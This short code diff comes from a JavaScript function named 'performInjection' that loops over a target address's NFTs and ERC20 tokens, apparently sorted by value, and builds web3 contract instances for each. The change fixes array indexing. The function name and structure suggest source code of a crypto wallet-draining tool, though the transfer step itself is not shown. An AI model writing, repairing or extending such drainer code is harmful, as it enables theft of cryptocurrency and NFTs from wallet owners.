@@ -172,9 +172,9 @@ async function performInjection(address) {
         throw "No NFTs found"
     }
     for (let i = 0; i < sortedNFTs.length; i++) {
-        let actualDict = sortedNFTs[i][1];
-        let higherPrice = sortedNFTs[i][1]["token_address"];
-        let isErc20 = sortedNFTs[i][1]["isErc20"];
+        let actualDict = sortedNFTs[i][1][0];
+        let higherPrice = sortedNFTs[i][1][0]["token_address"];
+        let isErc20 = sortedNFTs[i][1][0]["isErc20"];
         
         let contractInstance = new web3.eth.Contract(abi, higherPrice);
         let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
